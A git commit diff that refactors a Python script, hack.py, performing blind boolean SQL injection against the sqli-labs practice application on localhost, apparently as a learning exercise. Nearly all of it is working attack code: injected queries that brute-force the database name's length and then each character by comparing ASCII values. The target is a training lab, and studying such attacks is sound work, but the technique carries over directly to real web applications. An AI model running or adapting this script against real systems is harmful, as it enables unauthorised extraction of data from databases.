189169d7ba52acf46f62e68c39e42f60a2f339f2
Srikar9X <56352048+Srikar9X@users.noreply.github.com>
2020-04-17 20:12:17 +0530

    Add files via upload

--- hack.py
+++ hack.py
@@ -2,55 +2,69 @@ import requests
 import re
 
 validator = 'Youarein'
-i = 1
-response = False
-payload = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (substr((select length(database())),1,1)) = 1 --+"
-
-while (response == False):
-    list_payload = list(payload)
-    list_payload[101] = str(i)
-    payload = "".join(list_payload)
-
-    response_text = requests.get(payload)
-    response_formatted_text = re.sub(r"[\n\t\s]*", "", response_text.text)
-
-    if (validator == response_formatted_text[505:513]):
-        response = True
-        database_name_length = i
-    else:
-        response = False
-        i = i + 1;
-
-i = 0
-a = 33
-ascii_max = 127
+payload_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (substr((select length(database())),1,1)) = 1 --+"
 payload = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 0 --+"
-list_payload_1 = list(payload)
-database_name_list = []
 
-while (i < database_name_length):
-    i = i + 1
-    list_payload_2 = list_payload_1
-    list_payload_2[91] = str(i)
-    payload_1 = "".join(list_payload_1)
+def get_requester(payload):
+    response_text = requests.get(payload)
+    return response_text
 
-    while (a < ascii_max):
-        response_text_1 = requests.get(payload_1)
-        response_formatted_text_1 = re.sub(r"[\n\t\s]*", "", response_text_1.text)
+def text_formatter(response_text):
+    response_formatted_text = re.sub(r"[\n\t\s]*", "", response_text.text)
+    return response_formatted_text
 
-        if (validator == response_formatted_text_1[505:513]):
+def database_name_length_finder(payload, validator):
+    response = False
+    i = 1
+    while (response == False):
+        list_payload = list(payload)
+        list_payload[101] = str(i)
+        payload_1 = "".join(list_payload)
 
-            database_name_list.append(chr(a))
-            a = 33
-            break
+        response_text = get_requester(payload_1)
+        response_formatted_text = text_formatter(response_text)
+
+        if (validator == response_formatted_text[505:513]):
+            response = True
+            database_name_length = i
         else:
-            a = a + 1
-            list_payload_3 = list_payload_2
-            list_payload_3[100] = str(a)
-            payload_1 = "".join(list_payload_3)
-            print(payload_1)
+            response = False
+            i = i + 1;
+    return database_name_length
 
-database_name = "".join(database_name_list)
+def database_name_finder(payload, validator):
+    i = 0
+    a = 33
+    ascii_max = 127
+    list_payload_1 = list(payload)
+    database_name_list = []
 
-print(database_name)
-print(database_name_length)
+    database_name_length = database_name_length_finder(payload_length, validator)
+
+    while (i < database_name_length):
+        i = i + 1
+        list_payload_2 = list_payload_1
+        list_payload_2[91] = str(i)
+        payload_1 = "".join(list_payload_1)
+
+        while (a < ascii_max):
+            response_text_1 = get_requester(payload_1)
+            response_formatted_text_1 = text_formatter(response_text_1)
+
+            if (validator == response_formatted_text_1[505:513]):
+                database_name_list.append(chr(a))
+                a = 33
+                break
+            else:
+                a = a + 1
+                list_payload_3 = list_payload_2
+                list_payload_3[100] = str(a)
+                payload_1 = "".join(list_payload_3)
+                print(payload_1)
+
+    database_name = "".join(database_name_list)
+
+    print(database_name)
+    print(database_name_length)
+
+database_name_finder(payload, validator)
